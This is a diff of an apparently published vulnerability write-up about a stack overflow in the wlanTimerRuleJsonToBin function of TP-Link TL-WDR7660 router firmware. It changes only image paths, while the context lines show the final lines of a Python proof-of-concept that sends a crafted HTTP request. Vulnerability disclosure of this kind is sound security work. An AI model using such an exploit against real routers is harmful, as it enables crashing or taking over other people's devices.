@@ -3,7 +3,7 @@
 
 The wlanTimerRuleJsonToBin function is not checked when handling a copy of the important parameter name.It can result in the stack to overflow
 
-![image](TPlink/TL-WDR7660/image/1.png)
+![image](image/1.png)
 
 **Exploit a vulnerability in the wlanTimerRuleJsonToBin function by sending a carefully constructed HTTP request**
 ```
@@ -31,4 +31,4 @@ response = requests.post(url, headers=headers, json=data)
 print(response.text)
 ```
 **The following figure shows the result**
-![image](TPlink/TL-WDR7660/image/2.png)
+![image](image/2.png)
